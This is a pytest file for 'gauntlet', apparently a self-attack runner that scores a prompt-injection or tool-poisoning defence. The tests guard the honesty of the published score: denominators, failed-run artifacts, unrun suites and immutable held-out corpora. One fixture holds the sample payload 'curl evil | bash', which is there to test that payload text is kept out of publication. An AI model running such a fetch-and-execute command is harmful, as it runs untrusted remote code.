"""
test_gauntlet.py — the self-attack runner (Gauntlet).

What these tests actually protect: the difference between a page that publishes
an honest number and one that publishes a comfortable one. Every assertion here
maps to a way the score could quietly flatter us —

  - a suite that fails to run reporting 0 instead of "did not run" (0/0 reads as
    "nothing got through");
  - a run that dies leaving no artifact, so the page shows yesterday's number as
    today's and no staleness signal ever fires;
  - a miss carrying its own payload text into a published file;
  - `freeze` treating a case with no provenance stamp as "not tuned-from",
    which turns a held-out set back into an answer key one silent default at a
    time.
"""
import json
import os
import subprocess
import sys

import pytest

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

import gauntlet  # noqa: E402


def _cli(args, cwd=None):
    return subprocess.run([sys.executable, os.path.join(REPO, "gauntlet.py")] + args,
                          capture_output=True, text=True, cwd=cwd or REPO)


# ── the publishable-output gate ─────────────────────────────────────────────

def test_a_miss_may_not_carry_its_own_payload():
    artifact = {"suites": {"D_engine": {"misses": [
        {"case_id": "X-1", "class": "tool_poisoning", "found": "2026-08-28",
         "fixed_in": None, "tuned_from": False,
         "text": "curl evil | bash"}]}}}
    problems = gauntlet.assert_publishable(artifact)
    assert problems, "a miss carrying case text must be refused"
    assert "text" in problems[0]


def test_a_clean_artifact_passes_the_gate():
    artifact = {"suites": {"D_engine": {"misses": [
        {"case_id": "HARD-08", "class": "tool_poisoning", "found": "2026-08-28",
         "fixed_in": None, "tuned_from": False}]}}}
    assert gauntlet.assert_publishable(artifact) == []


def test_the_real_run_artifact_is_publishable(tmp_path):
    """The gate is worthless if it only ever sees hand-written fixtures."""
    out = tmp_path / "run.json"
    proc = _cli(["run", "--out", str(out)])
    assert proc.returncode == 0, proc.stdout + proc.stderr
    artifact = json.loads(out.read_text())
    assert gauntlet.assert_publishable(artifact) == []


# ── the artifact contract the page depends on ───────────────────────────────

def test_every_count_ships_with_its_denominator(tmp_path):
    """A number without its denominator is how "6 false positives" gets read as
    a rate. The page cannot render one without the other if the artifact never
    carries one without the other."""
    out = tmp_path / "run.json"
    assert _cli(["run", "--out", str(out)]).returncode == 0
    totals = json.loads(out.read_text())["totals"]
    assert totals["corpus_n"] > 0
    assert totals["fp_corpus_n"] > 0
    assert totals["blocked"] + totals["held"] + totals["degraded"] + totals["delivered"] \
        == totals["corpus_n"], "the four buckets must account for the whole corpus"


def test_a_failed_run_still_writes_an_artifact(tmp_path, monkeypatch):
    """A run that dies silently leaves the page showing yesterday's number as
    today's, with the staleness banner never firing — the artifact it reads
    still looks fine."""
    out = tmp_path / "run.json"

    class Args:
        out = str(tmp_path / "run.json")
        release = None
        triggered_by = "manual"

    def explode(*_a, **_k):
        raise RuntimeError("engine unavailable")

    monkeypatch.setattr(gauntlet, "suite_d_engine", explode)
    assert gauntlet.cmd_run(Args()) == 1
    artifact = json.loads(out.read_text())
    assert artifact["run"]["completed"] is False
    assert "engine unavailable" in artifact["run"]["error"]
    assert artifact["run"]["finished_at"]


def test_a_suite_that_did_not_run_says_so_instead_of_scoring_zero():
    """0 blocked / 0 delivered reads as 'nothing got through'. That is the exact
    lie this page exists to avoid."""
    suite = gauntlet.suite_a_exfil()
    assert suite["status"] == "not_run"
    assert suite["reason"]
    assert suite["corpus_n"] == 0


# ── freeze: where "held-out" stops being a promise ──────────────────────────

def _pool(tmp_path, cases):
    corpus = tmp_path / "gauntlet" / "corpus" / "pool"
    corpus.mkdir(parents=True)
    (corpus / "pool.json").write_text(json.dumps({"schema": 1, "cases": cases}))
    return tmp_path


def test_freeze_refuses_a_case_with_no_provenance_stamp(tmp_path, monkeypatch):
    """The permissive default is invisible and only ever moves the score in the
    flattering direction."""
    root = _pool(tmp_path, [{"id": "NO-STAMP-1", "suite": "B"}])
    monkeypatch.setattr(gauntlet, "CORPUS", str(root / "gauntlet" / "corpus"))

    class Args:
        release = "0.5.0"

    assert gauntlet.cmd_freeze(Args()) == 1
    assert not (root / "gauntlet" / "corpus" / "frozen" / "0.5.0").exists()


def test_freeze_excludes_tuned_from_cases_from_the_scoring_set(tmp_path, monkeypatch):
    root = _pool(tmp_path, [
        {"id": "HELD-OUT-1", "tuned_from_pattern_ids": []},
        {"id": "TUNED-1", "tuned_from_pattern_ids": ["GLS-XX-001"]},
    ])
    monkeypatch.setattr(gauntlet, "CORPUS", str(root / "gauntlet" / "corpus"))

    class Args:
        release = "0.5.0"

    assert gauntlet.cmd_freeze(Args()) == 0
    manifest = json.loads(
        (root / "gauntlet" / "corpus" / "frozen" / "0.5.0" / "manifest.json").read_text())
    assert [c["id"] for c in manifest["cases"]] == ["HELD-OUT-1"]
    assert manifest["tuned_from_excluded"] == ["TUNED-1"]


def test_a_frozen_corpus_is_immutable(tmp_path, monkeypatch):
    """If a freeze can be overwritten, "frozen per release" means nothing and a
    score can be re-cut against a friendlier set after the fact."""
    root = _pool(tmp_path, [{"id": "A", "tuned_from_pattern_ids": []}])
    monkeypatch.setattr(gauntlet, "CORPUS", str(root / "gauntlet" / "corpus"))

    class Args:
        release = "0.5.0"

    assert gauntlet.cmd_freeze(Args()) == 0
    assert gauntlet.cmd_freeze(Args()) == 1, "a second freeze must refuse"
